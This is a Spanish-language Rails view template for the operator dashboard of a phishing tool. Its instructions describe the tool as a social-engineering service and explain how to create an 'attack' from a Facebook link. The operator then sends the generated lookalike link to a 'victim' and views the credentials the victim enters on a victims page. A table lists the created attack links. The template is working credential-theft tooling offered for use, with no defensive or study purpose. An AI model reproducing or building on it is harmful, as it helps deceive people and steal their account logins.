<script type="text/javascript">
	function copia_portapapeles( id){ 
		text=$("#link"+id).html();
	   window.prompt("Copia este texto:", text);
	}
</script>
<div class="container">

	<div  class="row">
  	<div class="col-md-12 text-center">
  		<h1>Ataques</h1>
  	</div>
  </div>
  <br>
  	<br>
 	<div  class="row">
 		<div class="col-md-12">
	  		 <h2>Instrucciones:</h2>
	  	</div>
	  </div>
	  <div  class="row">
 		<div class="col-md-6">
		  	<div class="col-md-12 jumbotron">
		  		 <h2>¿Como Funciona?</h2>
		  		 <br>
		  		 <p>
		  		 	Esta plataforma es un servicio de ingeniería social por lo tanto es necesario generar una trampa para que sea el mismo usuario el que te proporcione los datos para la creación de esta trampa se deben seguir los siguientes pasos.
		  		 </p>
		  	</div>
	  	</div>
	  	<div class="col-md-6">
			<div class="col-md-12 jumbotron">
				 <h2>Pasos</h2>
				 <ul class="list-group">
				  <li class="list-group-item">
				    <span class="badge">1</span>
				    Copiar el un link de algun contenido de facebook el cual servira para redireccionar la pagina.
				  </li>
				  <li class="list-group-item">
				    <span class="badge">2</span>
				    pegar el link de escontenido en campo de texto que se encuentra abajo.
				  </li>
				  <li class="list-group-item">
				    <span class="badge">3</span>
				    Precionar el boton de crear ataque
				  </li>
				  <li class="list-group-item">
				    <span class="badge">3</span>
				    Copiar el link y enviarselo a la victima si esta ingresa sus datos podras verlos <%=link_to "aquí", "/welcome/victimas"%>
				  </li>
				</ul>
		  	</div>
	  	</div>
 	</div>
 		<%= form_for @ff,:html => {:class => "form-horizontal"} do |f|%>
	  <fieldset>
		  <legend>Crear nuevo ataque</legend>
		  <div class="form-group">
	       		<%= f.label "Link de redirecion",class:"col-lg-2 control-label"%>
	      <div class="col-lg-4">
	       		<%= f.text_field :link , class:"form-control"%>
	      </div>
	    </div>
	  <%= f.text_field :idusuario, value: current_user.id , type:"hidden"%>
	  <div class="form-group">
      <div class="col-lg-10 col-lg-offset-2">
      	<div class="radio">
  			<label><input type="radio" name="facebook"checked="checked" >Facebook</label>
		</div>
        <%= f.submit "Crear ataque", class:"btn btn-primary" %>
      </div>
    </div>
	 
	  </fieldset>

	<% end %>
 	<div class="row">
 		<div class="col-md-12">
 			<h3>lista de ataques:</h3>
 		</div>
 	</div>
 	<table class="table table-striped table-hover ">
 	   <thead>
	    <tr>
	      <th>#</th>
	      <th>Link de Ataque</th>
	      <th>Ir al sitio</th>
	      <th>Eliminar</th>
	      <th>Copiar</th>
	    </tr>
  	  </thead>
	  <tbody>
	  	<%cont = 0;%>
	  	<%@ataques.each do |f|%>
	  	<%cont = cont+1;%>
	    <tr>
	      <td><%=cont%></<td>
	      <td id="link<%=cont%>"><%="https://facebook--content.herokuapp.com/?usuario=#{f.idusuario}&link=#{f.id}"%></td>
	      <td><%=link_to "ir","#{f.link}"%></td>
	      <td><%=link_to "Eliminar", f,method: :delete%></td>
	      <td><input type="button" value="Copiar" onclick="copia_portapapeles(<%=cont%>)"> </td>
	    </tr>
	    <%end%>
	  </tbody>
	</table> 	
	<div class="row">
 		<div class="col-md-12">
 			<h3>Crear ataque:</h3>
 			<a href="#" class="btn btn-danger" data-toggle="modal" data-target="#myModal">ver mas</a>
 			 
 		</div>
 	</div>
 	<div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Modal Header</h4>
        </div>
        <div class="modal-body">
          <p>Some text in the modal.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
</div>